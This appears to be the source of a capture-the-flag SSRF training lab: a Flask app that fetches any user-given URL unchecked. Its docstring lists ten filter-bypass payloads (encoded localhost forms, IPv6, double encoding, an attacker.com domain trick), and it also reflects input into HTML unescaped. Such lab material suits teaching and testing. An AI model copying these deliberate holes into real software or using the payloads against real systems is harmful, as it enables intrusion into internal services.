"""
SSRF Lab 19: Advanced Filter Bypass
Difficulty: 4 (Expert)
Points: 150

Description:
Advanced SSRF filter bypass techniques.
"""

from flask import Flask, request
import requests
from urllib.parse import urlparse

app = Flask(__name__)

@app.route('/')
def index():
    """
    VULNERABLE: Advanced filter bypass
    
    Attack Vector:
    1. Case variation: hTtP://lOcAlHoSt:8080
    2. Hex encoding: http://%6c%6f%63%61%6c%68%6f%73%74/
    3. Octal encoding: http://0177.0000.0000.0001/
    4. Decimal IP: http://2130706433/ (127.0.0.1 as decimal)
    5. Mixed encoding: http://127.0o.0.1 (octal)
    6. Double encoding: http://localhost%252f%252fadmin
    7. Alternative ports: http://localhost:127.0.0.1 (some parsers accept)
    8. Unicode normalization: http://localḥost/
    9. IPv6: http://[::1]/ or http://[::ffff:127.0.0.1]/
    10. Domain confusion: http://127.0.0.1.attacker.com treated as 127.0.0.1
    
    Flag: FLAG{ssrf_advanced_bypass_019}
    """
    url = request.args.get('url', '')
    content = None
    error = None
    
    if url:
        try:
            # VULNERABLE: No proper validation
            response = requests.get(url, timeout=5)
            content = response.text[:1000]
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Advanced Filter Bypass SSRF</h1>
        <form method="GET">
            <input type="text" name="url" placeholder="Encoded URL" size="70" value="{url}">
            <button>Request</button>
        </form>
        {f"<pre>{content}</pre>" if content else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

@app.route('/admin')
def admin():
    return "ADMIN PANEL - BYPASS SUCCESSFUL!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5019, debug=False)
